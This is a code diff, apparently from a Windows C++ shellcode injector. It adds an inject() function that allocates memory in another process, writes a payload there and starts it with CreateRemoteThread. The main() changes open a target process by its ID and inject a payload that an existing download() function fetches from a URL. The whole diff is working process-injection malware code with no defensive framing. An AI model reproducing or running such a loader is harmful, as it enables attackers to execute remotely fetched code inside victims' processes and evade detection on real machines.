@@ -40,6 +40,7 @@ int walk(const char* processName) {
 	return 0;
 }
 
+// Given a URL, download and return data
 string download(const char* payloadUrl) {
 	IStream* stream;
 
@@ -64,6 +65,25 @@ string download(const char* payloadUrl) {
 	return payload;
 }
 
+// Inject shellcode into remote process
+int inject(HANDLE targetProc, const char* payload, unsigned int payloadLen) {
+	LPVOID addr = NULL;
+	HANDLE threadHandle = NULL;
+	SIZE_T bytesWritten;
+
+	addr = VirtualAllocEx(targetProc, NULL, payloadLen, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(targetProc, addr, (PVOID)payload, (SIZE_T)payloadLen, &bytesWritten);
+	threadHandle = CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);
+
+	if (threadHandle != NULL) {
+		printf("Payload is running...\n");
+		WaitForSingleObject(threadHandle, -1);
+		printf("Payload is done!\n");
+		return 0;
+	}
+
+	return -1;
+}
 
 int main(void) {
 
@@ -77,9 +97,27 @@ int main(void) {
 	printf("PID: %d\n", procID);
 
 	// Open process
+	if (procID <= 0) {
+		printf("Failed to find/handle process :(\n");
+		return -1;
+	}
+	HANDLE targetProc = OpenProcess(PROCESS_CREATE_THREAD |
+		PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_OPERATION |
+		PROCESS_VM_READ,
+		FALSE,
+		(DWORD)procID);
 
 	// Inject payload
+	int result = inject(targetProc, payload.c_str(), strlen(payload.c_str()));
 
 	// Close
-	return 1;
+	if (result == 0) {
+		printf("Successfull inject!\n");
+		return 0;
+	}
+	else {
+		printf("Something went wrong :(\n");
+		return -1;
+	}
 }
